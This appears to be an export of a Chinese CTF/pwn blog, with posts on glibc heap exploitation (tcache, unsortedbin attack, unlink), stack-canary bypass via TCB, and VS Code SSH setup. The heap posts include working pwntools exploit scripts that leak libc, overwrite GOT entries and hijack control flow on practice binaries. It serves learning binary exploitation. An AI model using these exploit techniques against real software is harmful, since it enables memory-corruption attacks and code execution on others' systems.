p64(0)+p8(7)add(0x10,payload)#2\n\nadd(0x90,b&#x27;aaaa&#x27;)#3add(0x20,b&#x27;aaaa&#x27;)#4delete(3)\n\n随后申请一个0x90大小的chunk 对应着0xa0的链表 chunk4则是用来防止合并\n释放chunk3以后 会发现 其成功进入了unsortedbin\n\n于是我们就达到了攻击效果\nentry指针数组我们先来随便释放几个不同size的chunk 来观察一下entry数组的情况\n\n可以看到其指向的是chunk的用户地址 而非首地址\n接着 我们将0x20链表的entry指针修改一下 然后再次申请0x10大小的chunk 看会分配给我们什么\nadd(0x10,b&#x27;aaaa&#x27;)add(0x20,b&#x27;aaaa&#x27;)add(0x30,b&#x27;aaaa&#x27;)delete(0)delete(1)delete(2)debug()add(0x10,b&#x27;aaaa&#x27;)pause()\n\n\n修改的地址调整为tcache_perthread_struct结构体的实际空间首地址\n\n可以看到 成功任意申请到了tcache_perthread_struct的空间 还有一点可以注意的 \n按照原本的源码逻辑 对应的地址是已经存在chunk头的 所以申请并不会重新覆写 因为在实际任意地址写的时候不用担心chunk头对地址的影响\nmp_.tcache_bins通过覆盖mp_.tcache_bins的值 即可扩大tcachebin的容纳范围 \nif (tc_idx &lt; mp_.tcache_bins      &amp;&amp; tcache      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0)    &#123;      victim = tcache_get (tc_idx);      return tag_new_usable (victim);    &#125;\n\n可以看到 如果tc_idx 小于 mp_.tcache_bins的话 就会被认为是可以被释放到tcachebin中\n通常适用于largebin attack配合\n下面是索引方式 通过计算偏移可以获得\n\n之所以是0x40 对应的是tcache_perthread_struct中entry数组的指针数\n不过将其修改后 释放超过原本大小的chunk进入tcache 并不会被pwndbg调试捕捉到 因为原本的entry数组并没有空间供超范围的chunk使用\n其作用不单单可以运用于使大chunk也能释放进入tcachebin 还可以做到任意写的效果\n正常情况下 一个chunk被释放进入tcachebin  其指针会保存在tcache_perthread_struct中entry数组\n\n\n如果利用上面提到的方法 使得更大的chunk被释放到tcachebin中呢  那么原本的entry数组显然没有空间\n于是就会顺着高地址扩展  如果size足够大 就会扩张到高地址处的chunk中 从而这个指针就被我们掌握了 (如果有编辑堆块的办法)  于是就达到了任意写的作用\n比如下面 扩大mp_.tcache_bins的值 \n\n并且释放一个0x500的chunk进入tcachebin\n\n此时这个chunk的entry就会顺着偏移 跑到被我们控制的chunk(物理相邻tcache_perthread_struct)\n如果我们修改这个entry 使其为我们要任意写的地址 再次申请对应大小的chunk 就可以达到任意写的目的\n","categories":["堆"]},{"title":"unsortedbinAttack","url":"/2022/11/21/unsortedbinAttack/","content":"距离上一篇堆的知识点很长时间了  这段时间主要是自己基础的梳理了一些简单的堆漏洞利用手法\n本文讲述unsortedbin在不同环境下的利用办法\n这一部分还是比较简单的\n基础知识这里先要有一个概念 在glibc版本2.26(可以简单记成18.04后)以后 新增了tcachebins 其机制会影响到堆块释放后进入unsortedbin\n我们先留意一下随着glibc版本的不同  接着说回正文\n一个堆块被释放以后 如果他的大小大于fastbin或者tcache的范围 那么他就会先进入unsortedbin\n如果unsortedbin的链表中只有其一个堆块 那么他的fd域和bk域都将指向main_arean+0x88（这里的数值不是固定的）\n\n此时如果用户再次申请一个chunk\n1.如果该chunk的大小不超过unsortedbin中的chunk大小  那么就会分割出用户需要的\n\n比如此时我再次申请一个0x40大小的堆块  就是从原来的free chunk中分割出来的  并且其fd和bk域的数值会保留下来\n一起分配给了用户  所以我们可以利用这个特性泄露libc基址(如果程序有打印出chunk内容的机会)\n这里有个小疑点  为什么用户新申请出来的chunk的fd和bk会和原来的chunk的不一样(待解)\nubuntu16.04泄露基址[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n自己编译了一个简单的堆题\n程序主体就简单发一下各函数就行了 内容也不必看 就知道有个打印chunk内容的机会和堆溢出 uaf等漏洞\nint create()&#123;  void *v0; // rax  int v2; // [rsp+0h] [rbp-10h] BYREF  int v3; // [rsp+4h] [rbp-Ch] BYREF  void *v4; // [rsp+8h] [rbp-8h]  printf(&quot;Index: &quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v3);  LODWORD(v0) = v3;  if ( v3 &lt;= 31 )  &#123;    v0 = *(&amp;Page + v3);    if ( !v0 )    &#123;      printf(&quot;Size &quot;);      __isoc99_scanf(&quot;%d&quot;, &amp;v2);      if ( v2 &gt; 256 )      &#123;        LODWORD(v0) = puts(&quot;over size&quot;);      &#125;      else      &#123;        v0 = malloc(v2);        v4 = v0;        if ( v0 )        &#123;          *(&amp;Page + v3) = v4;          Size[v3] = v2;          LODWORD(v0) = puts(&quot;OK&quot;);        &#125;      &#125;    &#125;  &#125;  return v0;&#125;\n\n__int64 edit()&#123;  __int64 result; // rax  unsigned int v1; // [rsp+Ch] [rbp-4h] BYREF  printf(&quot;Index: &quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  result = v1;  if ( v1 &lt;= 31 )  &#123;    result = *(&amp;Page + v1);    if ( result )    &#123;      printf(&quot;Content: &quot;);      result = vuln(*(&amp;Page + v1), Size[v1]);    &#125;  &#125;  return result;&#125;\n\nint show()&#123;  int result; // eax  int v1; // [rsp+Ch] [rbp-4h] BYREF  printf(&quot;Index: &quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  result = v1;  if ( v1 &lt;= 31 )    result = printf(&quot;Content: %s\\n&quot;, *(&amp;Page + v1));  return result;&#125;\n\n__int64 del()&#123;  __int64 result; // rax  unsigned int v1; // [rsp+Ch] [rbp-4h] BYREF  printf(&quot;Index: &quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  result = v1;  if ( v1 &lt;= 31 )  &#123;    free(*(&amp;Page + v1));    *(&amp;Page + v1) = 0LL;    result = v1;    Size[v1] = 0;  &#125;  return result;&#125;\n\ngdb动调exp:\nfrom pwn import*io = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;def create(index,size):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;1&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size &quot;)    io.sendline(str(size))def edit(index,payload):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;2&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Content: &quot;)    io.sendline(payload)def delete(index):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;4&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;3&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))create(1,0x88)create(2,0x20)delete(1)create(3,0x48)show(3)io.recv()\n\n[DEBUG] Received 0x2e bytes:    00000000  43 6f 6e 74  65 6e 74 3a  20 f8 7b d4  61 1a 7f 0a  │Cont│ent:│ ·&#123;·│a···│    00000010  31 2e 41 44  44 0a 32 2e  43 48 41 4e  47 45 0a 33  │1.AD│D·2.│CHAN│GE·3│    00000020  2e 50 52 49  4e 54 0a 34  2e 44 45 4c  0a 3a        │.PRI│NT·4│.DEL│·:│    0000002e\n\n最后成功泄露出libc地址\nubuntu 18.04泄露基址二进制文件同上\nexp:\nfrom pwn import*io = process(&quot;./heap&quot;)elf = ELF(&quot;./heap&quot;)context.log_level = &quot;debug&quot;def create(index,size):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;1&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size &quot;)    io.sendline(str(size))def edit(index,payload):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;2&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Content: &quot;)    io.sendline(payload)def delete(index):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;4&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;:&quot;)    io.sendline(b&quot;3&quot;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))create(1,0x90)create(2,0x20)for i in  range(3,10):    create(i,0x90)for i in range(3,10):    delete(i)delete(1)create(10,0x90)show(10)\n\n办法就是利用 tcachebin的一条链表中只能存放7个chunk 只要我们把其填满了 那么再次释放一个相同大小的chunk就会进入unsortedbin\n\n这里将我们最开始申请的chunk1释放以后 其就因为对应的tcachebin中位置已满 所以进入了unsortedbin  那么接下来利用show函数输出即可\n[DEBUG] Received 0x2e bytes:    00000000  43 6f 6e 74  65 6e 74 3a  20 30 7d 05  ac 42 7f 0a  │Cont│ent:│ 0&#125;·│·B··│    00000010  31 2e 41 44  44 0a 32 2e  43 48 41 4e  47 45 0a 33  │1.AD│D·2.│CHAN│GE·3│    00000020  2e 50 52 49  4e 54 0a 34  2e 44 45 4c  0a 3a        │.PRI│NT·4│.DEL│·:│    0000002e\n\n这里同时也说明了一点 当tcachebin和unsortedbin中都有free chunk时 且用户申请的chunk大小小于等于二者时unsortedbin优先提供给用户\n任意地址写如果单独利用那么是比较鸡肋的一个漏洞点 但是如果配合其他漏洞一起使用 效果非常强大\n主要利用的是unsortedbin取出后 会对其链表进行清空\n/* remove from unsorted list */          if (__glibc_unlikely (bck-&gt;fd != victim))            malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);\n\n其中bck在代码开始进行了赋值 bck &#x3D; victim-&gt;bk;\n也就是说如果我们修改了victim的bk域 就会使得unsorted_chunks (av)+0x18处修改为我们修改的bk域\n以及我们修改的地址+0x10处填入unsorted_chunks (av)\n调试环境 libc2.27\nbss_addr = 0x602200add(0x410,b&#x27;aaaa&#x27;)#0add(0x10,b&#x27;aaaa&#x27;)#1delete(0)payload = p64(0)+p64(bss_addr-0x10)edit(0,len(payload),payload)add(0x410,b&#x27;aaaa&#x27;)#2debug()\n\nchunk1用来防止chunk0进入unsortedbin后和top chunk合并\n修改chunk0的bk域为bss_addr-0x10  这样到时候bss_addr 就会被写入unsorted_chunks (av)\n动调看一下\n\n你会发现这时候由于main_arena的结构被破坏了 plmalloc仍然认为chunk0处于free状态 但是我们的chunk2确实是申请到了chunk0的空间\n这时候如果我们想要再次申请一个chunk 就会报错 这一点要注意\n\n此时各地址的值都如我们预期想象的那样\nunsorted bin into stack漏洞的原理在于 plmalloc在申请chunk的时候会先去unsortebin中寻找合适的chunk 如果size不符合则通过bk指针索引下一个\n如果我们修改chunk的size和bk  就可以误导plmalloc去对我们构造的fake chunk进行检查 如果通过了检查 就会分配fake chunk给用户\n跟着下面这个程序动调一下就清楚了(不是我写的 我也不知道出处 可能是how2heap的?)\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main() &#123;  intptr_t stack_buffer[4] = &#123;0&#125;;  fprintf(stderr, &quot;Allocating the victim chunk&quot;);  intptr_t* victim = malloc(0x100);  fprintf(stderr, &quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()&quot;);  intptr_t* p1 = malloc(0x100);  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin&quot;, victim);  free(victim);  fprintf(stderr, &quot;Create a fake chunk on the stack&quot;);  fprintf(stderr, &quot;Set size for next allocation and the bk pointer to any writable address&quot;);  stack_buffer[1] = 0x100 + 0x10;  stack_buffer[3] = (intptr_t)stack_buffer;  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointern&quot;);  fprintf(stderr, &quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_memn&quot;);  victim[-1] = 32;  victim[1] = (intptr_t)stack_buffer;  fprintf(stderr, &quot;Now next malloc will return the region of our fake chunk: %pn&quot;, &amp;stack_buffer[2]);  fprintf(stderr, &quot;malloc(0x100): %pn&quot;, malloc(0x100));&#125;\n\n编译指令: gcc -g xxx.c   //加-g动调的时候就可以依据代码逐行进行\n\n首先是申请了两个chunk chunk0用来误导plmalloc chunk1用来防止chunk0和top chunk合并\n\n释放chunk0 进入unsortedbin\n\n伪造局部变量数组(也就是位于栈上的一块内存) 修改size域和bk域 bk域是为了迎合检查 双向链表的完整性\n\n修改chunk0的size域和bk域 误导plmalloc\n\n最后申请一个0x100大小的chunk 分配到的区域为栈上的数组\n\n","categories":["堆"]},{"title":"unlink","url":"/2022/11/28/unlink/","content":"很多时候 堆题的操作都是篡改got表 从而getshell 为了达到这一目的 就需要我们得到任意地址写的机会\n其中unlink就是一个典型的办法\n其主要分为两种情况 向后合并和向前合并\n向后合并本次演示基于的二进制文件 这里就不展示反编译后的代码了 其拥有堆溢出的机会 所以我们可以通过这个修改chunk的size域\n先来看一下用于调试的代码\ncreate(0,0x18)create(1,0x28)create(2,0x28)payload = cyclic(0x18)+b&quot;\\x61&quot;edit(0,payload)\n\n申请了三个堆块 chunk0是用于堆溢出覆盖chunk1的size域\ngdb查看一下当前堆的状况\n\n可以看到chunk1和chunk2已经成功合并了  并且你要注意一下大小 chunk1我们申请的是0x28 但是由于堆的机制  64位的情况下申请的堆块的基本单位是0x10 所以此时这个堆块的用户空间是0x20 而gdb上显示的是0x31(0x20+0x10+0x1)\n所以溢出覆盖size域的大小应该是chunk实际占用的大小\n\n如果利用这种机制呢？我们chunk此时是和chunk1合并了 但是我们仍然有一个指向chunk2的指针不是吗？\n如果我们此时再edit chunk2 输入的数据会存放在哪里呢\ncreate(0,0x18)create(1,0x28)create(2,0x28)payload = cyclic(0x18)+b&quot;\\x61&quot;edit(0,payload)edit(2,b&quot;aaaaaaaa&quot;)gdb.attach(io)\n\n\n其仍然有效 此时你有没有一些利用的想法 利用这个系统觉得不存在的指针？\ncreate(0,0x18)create(1,0x68)create(2,0x68)create(3,0x20)payload = cyclic(0x18)+b&quot;\\xe1&quot;edit(0,payload)delete(1)create(4,0x68)create(5,0x68)delete(5)edit(2,b&quot;aaaaaaaa&quot;)gdb.attach(io)\n\n看一下这个流程 看看能不能领会其用意\n我们逐步分析一下\n申请的chunk0，1，2没有什么疑问 是为了合并chunk\nchunk3是为了防止chunk1释放以后和top chunk合并\n紧接着申请了一个0x68大小的chunk4 系统就会把之前存储在unsortedbin的0xe0大小的chunk分割\n此时chunk4申请到的内存空间和chunk1(未合并前)是一样的\n此时我们再次申请0x68大小的chunk 分配给chunk5的就是原先chunk2的空间了\n但是这里注意一下 chunk2的指针是不是仍然存在 那我们就拥有了两个指向同一内存空间的指针\n我们哪怕释放掉了这个chunk 我们也可以edit其内容 如果这个chunk被释放到了fastbin呢？那么我们edit其chunk内容 是不是输入的第一个字长就是覆盖了fd域的空间 也就是说 我们伪造了一个fake chunk 让系统以为  当前的单向链表 这个chunk的下一个是我们伪造的内存空间\n\n可以看到 系统把aaaaaaaa当成了一个chunk的地址\n是不是觉得很简单 那么我们接下来再看unlink的源码\n/* Take a chunk off a bin list. */static voidunlink_chunk (mstate av, mchunkptr p)&#123;//检查chunk的size和next_chunk的prev_size是否一致if (chunksize (p) != prev_size (next_chunk (p)))malloc_printerr (“corrupted size vs. prev_size”);mchunkptr fd = p-&gt;fd;mchunkptr bk = p-&gt;bk;//检查fd和bk(双向链表完整性)if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))malloc_printerr (“corrupted double-linked list”);fd-&gt;bk = BK;bk-&gt;fd = FD;if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)&#123;//检查largebin中next_size双向链表的完整性if (p-&gt;fd_nextsize-&gt;bk_nextsize != p|| p-&gt;bk_nextsize-&gt;fd_nextsize != p)malloc_printerr (“corrupted double-linked list (not small)”);if (fd-&gt;fd_nextsize == NULL)&#123;if (p-&gt;fd_nextsize == p)fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;else&#123;fd-&gt;fd_nextsize = p-&gt;fd_nextsize;fd-&gt;bk_nextsize = p-&gt;bk_nextsize;p-&gt;fd_nextsize-&gt;bk_nextsize = fd;p-&gt;bk_nextsize-&gt;fd_nextsize = fd;&#125;&#125;else&#123;p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;&#125;&#125;&#125;\n\n主要有两个检查\n1.检查当前chunk的size和nextchunk的prev_size是否相同\n2.检查链表的完整性，即fd和bk\n这里size的检查很容易就绕过了 接下来的理解难点在于链表的fd和bk的伪造\n\nif(__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P,0))             malloc_printerr (&quot;corrupted double-linked list&quot;);//其中的FD和BK和P为上图所示\n\n关键在于这一个if判断\n如果你和我一样 学到这里的时候 c语言的指针都还没学透 那你可以仔细阅读下面这段话 方便你理解接下来的判断式\nFD-&gt;bk相当于表示FD结构体的成员bk 而bk为结构体变量指针类型存储的是FD的上一个chunk，即P的prev_size的地址BK-&gt;fd同理 把这两个判断转化一下就是 unlink过后 BK和FD就抛弃了中间的P 他们二者的fd和bk指针互连\n\nFD-&gt;bk != P || BK-&gt;fd != PFD和BK之前已经定义过了FD = P-&gt;fd;BK = P-&gt;bk;所以上述的式子相当于:P-&gt;fd-&gt;bk == P &lt;=&gt; *(p-&gt;fd +0x18) == P &lt;=&gt;相当于恒等于p-&gt;bk-&gt;fd == P &lt;=&gt; *(p-&gt;bk +0x10) == P \n\n所以我们构造的fake_chunk的fd应该是ptr_addr-0x18\nbk应该是ptr_addr-0x10\n这里的ptr_addr即为我们想要任意写的地址\n检查通过以后 程序就会按照下面的式子修改FD和BK的fd和bk指针\nFD-&gt;bk = BK &lt;=&gt; P-&gt;fd-&gt;bk = p-&gt;bk &lt;=&gt; *(P-&gt;fd + 0x18) = P-&gt;bk //ⅠBK-&gt;fd = FD &lt;=&gt; P-&gt;bk-&gt;fd = p-&gt;fd &lt;=&gt; *(P-&gt;bk + 0x10) = P-&gt;fd //Ⅱ\n\nI式的演变过程:∵ P-&gt;fd = &amp;P - 0x18 ∴ *(&amp;P - 0x18 + 0x18) = P-&gt;bk =&gt; P = P-&gt;bk∵ P-&gt;bk = &amp;P - 0x10 ∴ P = &amp;P - 0x10\n\nII式的演变过程:∵ P-&gt;bk = &amp;P - 0x10 ∴ *(P-&gt;bk + 0x10) = P-&gt;fd =&gt; P = P-&gt;fd∵ P-&gt;fd = &amp;P - 0x18 ∴ P = &amp;P - 0x18\n\n所以 最后的p指针将指向&amp;p-0x18的位置 也就是说当我们成功unlink后 需要增加3个字长的垃圾数据后 才能覆盖到ptr_addr\n下面来看一下脚本\ncreate(0,0x80)create(1,0x80)create(2,0x80)ptr_addr = 0x6020C0backdoor_addr = 0x400806payload = p64(0)+p64(0x80)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)payload = payload.ljust(0x80,b&quot;0&quot;)payload += p64(0x80)+p64(0x90)edit(0,len(payload),payload)delete(1)payload = p64(0)*3+p64(elf.got[&#x27;printf&#x27;])edit(0,len(payload),payload)edit(0,8,p64(backdoor_addr))io.recvuntil(&quot;:&quot;)io.sendline(b&quot;1&quot;)io.interactive()\n\n我们先申请了三个chunk chunk0是用来构造fake_chunk chunk1则是用来迎合检查\nchunk0此时的内部构造为\n\n绿框部分是我们伪造的fakechunk 紫框为chunk1 我们将其的prev_size和size覆盖 为了通过第一个检查\n随后我们释放chunk1 如果我们构造成功 此时系统就会检查我们构造的链表是否正确\n如果通过了检查 我们构造的fakechunk就会从链表中脱离\n于是我们就得到了一个指向ptr_addr-0x18地址的chunk\n接下来要怎么利用 注意看上面脚本的ptr_addr是存放堆块指针的bss段的数组\n我们利用unlink将其存放chunk0的地址修改成printf_got的地址\n那么当我们第三次edit chunk0的时候 相当于就是往printf_got的地址写入数据\n于是我们将后门函数的地址写进去 当下次调用printf函数的时候 就进行了系统调用(后门函数是我为了演示方便加进去的 一般题目不会这么简单)\nps:这里在出unlink的题的时候 遇到了一个问题: 当释放chunk1想要进行unlink的时候 程序就会崩溃\n后来经过两天的坐牢时间 发现了问题的原因出在于存放堆块指针的那个数组的低地址处也要有至少0x18大小的全局数组\n即如下图所示 需要有个magic数组 各位师傅以后出unlink题的时候可以留意一下\n\n为什么我们经常看到别人的wp会写说 多申请一个chunk用来防止和top chunk合并 下面看一下演示\ncreate(0,0x80)delete(0)\n\n当我们只申请了一个chunk 并且将其释放以后 你预想的是他会进入对应的bin中 但是如果他物理相邻的高地址处的chunk是topchunk的话 topchunk就会触发向后合并\n\n我们需要多申请一个chunk在要释放的chunk的物理相邻高地址处\ncreate(0,0x80)create(1,0x20)delete(0)\n\n\n向前合并目前还没有遇到用到向前合并的题目 感兴趣的可以自行了解\n利用FD和BK的fd、bk指针buu上遇到了一题比较新颖的unlink 和常规的有所不同 这里以此为例题来讲讲\n其利用方向不是脱链获得任意写的机会 而是利用FD和BK在脱链后的fd和bk指针的变化来覆盖返回地址 控制程序执行流\n[*] &#x27;/home/chen/unlink1&#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n\n32位的堆 还是比较少见的\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char *v4; // [esp+4h] [ebp-14h] BYREF  _DWORD *v5; // [esp+8h] [ebp-10h]  _DWORD *v6; // [esp+Ch] [ebp-Ch]  malloc(0x400u);  v4 = (char *)malloc(0x10u);  v6 = malloc(0x10u);  v5 = malloc(0x10u);  *(_DWORD *)v4 = v6;  v6[1] = v4;  *v6 = v5;  v5[1] = v6;  printf(&quot;here is stack address leak: %p\\n&quot;, &amp;v4);  printf(&quot;here is heap address leak: %p\\n&quot;, v4);  puts(&quot;now that you have leaks, get shell!&quot;);  gets(v4 + 8);  unlink(v6);  return 0;&#125;\n\n申请了三个堆块 并且给出了堆块v4在栈上的地址和堆上的地址\n这里为了方便理解 我修改了下三个chunk的名称 接下来请以下方的代码为准\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char *v4; // [esp+4h] [ebp-14h] BYREF  _DWORD *v5; // [esp+8h] [ebp-10h]  _DWORD *v6; // [esp+Ch] [ebp-Ch]  malloc(0x400u);  A = (char *)malloc(0x10u);  B = malloc(0x10u);  C = malloc(0x10u);  *(_DWORD *)A = B;  B[1] = A;  *B = C;  C[1] = B;  printf(&quot;here is stack address leak: %p\\n&quot;, &amp;A);  printf(&quot;here is heap address leak: %p\\n&quot;, A);  puts(&quot;now that you have leaks, get shell!&quot;);  gets(A + 8);  unlink(B);  return 0;&#125;\n\n我们先来分析一下这四行代码对这三个堆块的内容进行了哪些操作\n*(_DWORD *)A = B;B[1] = A;*B = C;C[1] = B;\n\n第一行 *A&#x3D;B 将B的首地址存在了A的fd域(实际上A并没有被释放 所以其没有fd域 这里只是为了方便称呼)\n第二行 B[1]&#x3D;A B[1]相当于B的bk域 存储了A的首地址\n第三行 *B&#x3D;C 将c的首地址存在了B的fd域\n第四行 C[1]&#x3D;B 同理 将B的首地址存储在了c的bk域\n用图片来展示一下 此时三个堆块的情况\n\n可以看到 相当于模拟了三个chunk在双向链表中的情况\n接着给了我们一次堆溢出的机会\nget(A+8)相当于往A的bk域再往下一个字长处写入数据 即data域\n接着跟进一下unlink函数\n_DWORD *__cdecl unlink(int *a1)&#123;  _DWORD *result; // eax  int fd; // [esp+8h] [ebp-8h]  _DWORD *bk; // [esp+Ch] [ebp-4h]  bk = a1[1];  fd = *a1;  *(fd + 4) = bk;  result = bk;  *bk = fd;  return result;&#125;\n\n因为unlink的参数是B 所以此时bk和fd的赋值就是其名(我同样对变量名称进行了修改)\n在fd+4地址处的内容赋值为bk\n并且将bk地址处的内容赋值为fd\n那么这里就存在了一次任意地址写 如果我们通过堆溢出将fd覆盖为想要任意写的内容 接着将bk覆盖为想要任意写的地址\n就可以利用这一漏洞\n分析完了程序的主体流程和漏洞 接下来就是想着怎么利用了\n在左侧的函数栏中发现了一个后门函数 那么显然就是要将此后门函数覆盖某一地址 然后进行系统调用\n但是不同于以往的覆盖got表 这里在unlink函数结束以后 并没有调用任何libc函数\n那么只能将目光看向 main函数的栈帧结束后 汇编代码是如果ret到父函数\n.text:080485F2                 call    unlink.text:080485F7                 add     esp, 10h.text:080485FA                 mov     eax, 0.text:080485FF                 mov     ecx, [ebp+var_4].text:08048602                 leave.text:08048603                 lea     esp, [ecx-4].text:08048606                 retn\n\nlea     esp, [ecx-4] 显然 我们要利用的就是这一串汇编代码\n他会控制程序执行流往ecx-4所存储的地址\n再看到 mov     ecx, [ebp+var_4] ecx的值等同于ebp-4地址的值\n所以 我们就要利用堆溢出 覆盖B-&gt;fd为存储后门函数地址的地址  B-bk为ebp-4的地址\nfrom pwn import*io = process(&quot;./unlink1&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25709)elf = ELF(&quot;./unlink1&quot;)context.log_level = &quot;debug&quot;io.recvuntil(&quot;here is stack address leak: &quot;)stack_addr = int(io.recvuntil(&quot;\\n&quot;,drop = True),16)io.recvuntil(&quot;here is heap address leak: &quot;)heap_addr = int(io.recvuntil(&quot;\\n&quot;,drop = True),16)io.recvuntil(&quot;now that you have leaks, get shell!&quot;)shellheap_addr = heap_addr+12ebp4_addr = stack_addr+0x14-0x4shell_addr = 0x80484EBpayload = p32(shell_addr)+b&#x27;a&#x27;*12+p32(shellheap_addr)+p32(ebp4_addr)io.send(payload)io.interactive()\n\n","categories":["堆"]},{"title":"vscode远程连接","url":"/2022/11/13/vscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/","content":"先把虚拟机需要的环境配置一下\nsudo apt install openssh-server\n\nsudo apt install curl\n\n接着在物理机上创建一下ssh密匙\nssh-keygen -t rsa -b 4096 -f %USERPROFILE%/.ssh/debian_rsa\n\n然后自己下载一个vscode\n下载后打开 在扩展中搜索remote\n\n安装这个 然后进入到设置里面勾选这个\n\n然后左下角会多出来一个绿色的图标 按图上的点击顺序\n\n\n选择第一个\n然后自行配置\nHost 名称HostName ip地址User 虚拟机用户名IdentityFile &quot;C:\\Users\\xxxxx\\.ssh\\debian_rsa&quot;  //物理机的ssh私匙目录\n\n接着试着连接一下\n\n输入密码后就连接上了虚拟机\n但是每次都输入密码太麻烦了 我们之前弄的ssh就是为了免密连接\n\n在虚拟机对应目录下 创建一个文件authorized_keys\n接着把物理机中该文件的内容复制到虚拟机刚刚创建的文件中\nC:\\Users\\xxxx\\.ssh\\debian_rsa.pub\n\n然后就可以做到免密连接了 \n2023&#x2F;3&#x2F;6记今天配置kali虚拟机的远程连接的时候迟迟连接不上 原来是因为ssh服务并没有启动\n// 重启ssh 服务 sudo service ssh --full-restart// 自动启动 sudo systemctl enable ssh","categories":["虚拟机"]},{"title":"修改TCB来绕过canary","url":"/2023/02/17/%E4%BF%AE%E6%94%B9TCB%E6%9D%A5%E7%BB%95%E8%BF%87canary/","content":"以往做过的开启了canary保护的题目 一般都是通过格式化字符串泄露 从而来绕过canary 最近在学习免杀的时候 意外了解了canary的生成机制 从而就有了今天的这一篇文章 总体下来还是收获颇丰\n什么是canary由于c语言并没有检查数组的下标 所以其存在溢出的可能性 诱发了栈溢出漏洞 可以使得攻击者任意的控制程序执行流 对此 canary机制有效预防了栈溢出的操作\n其通过在栈帧的bp寄存器间隔一个字长(往低地址方向)的地方存放了一串随机数(末位为\\x00 目的是防止被printf等函数泄露)\n在函数结束前 进行了一个异或检查 如果发现此地址处的canary被修改了 那么则判定为发生了栈溢出的行为\n则会跳转到**___stack_chk_fail**函数 该函数负责输出错误信息并且终止程序\n\n函数栈帧在形成初期 从 fs:0x28 赋值 并将其入栈\n\n函数结束前进行异或判定 如果结尾为0 就通过jz指令跳转到 leave|ret 指令处返回父栈帧\n\n否则就调用**___stack_chk_fail**函数结束程序\n而在libc2.23及以下的版本中 ___stack_chk_fail函数会根据argv[0]存放的程序路径来输出下面这样的错误信息\n#include&lt;stdio.h&gt;int main()&#123;    char a[0x20];    read(0,a,0x30);&#125;\n\n\n而argv[0]位于当前栈帧的栈底 可以通过溢出篡改其为flag 从而获取flag\n\n这里直接在源码中修改argv[0] 看看效果\n#include&lt;stdio.h&gt;int main(int argc,char **argv)&#123;    char a[20];    argv[0]=&quot;hello,world&quot;;    read(0,a,0x30);&#125;\n\n\n不过 要注意的是 其输出的是路径 也就是字符串 而非输出该路径对应文件的内容\n接着我们更换一下libc 文件 使其为libc2.27再次尝试 源码不变\n\n可以发现其直接默认输出unknown了\n同时这里发现了一个有趣的现象 到达一定长度后 溢出的数据会被当作指令执行 这就需要进一步研究了\n\n不过由于我实在是太心急把这篇文章写出来 所以暂时是先咕咕了 后续会开一个新篇章研究这个现象\n上述稍微跑题了一下  说回canary  栈上的canary是由 fs:28h 处提供的值 我们对这个地址朔源一下\nfs是一个寄存器 其指向当前活动线程的TEB结构\nTEB是一个线程环境块   进程中每个线程都对应着一个TEB结构体 其存储了线程的各种信息\n不同的偏移对应着不同的信息\n000 指向SEH链指针004 线程堆栈顶部008 线程堆栈底部00C SubSystemTib010 FiberData014 ArbitraryUserPointer018 FS段寄存器在内存中的镜像地址020 进程PID024 线程ID02C 指向线程局部存储指针030 PEB结构地址（进程结构）034 上个错误号\n\n但是fs中存放的TEB地址需要经过解析之后才能显示\n\n调用pthread_self函数就可以获取到TEB的位置\n\n可以在对应位置找到canary 而canary判断是否被更改 是将栈上的和这里的进行比较\n如果我们修改了TEB上的canary  那么栈上的canary就可以很轻易的被我们绕过\n那么TEB上的canary又是从何而来呢  这就要从内核的_dl_random说起了\n其是一个地址 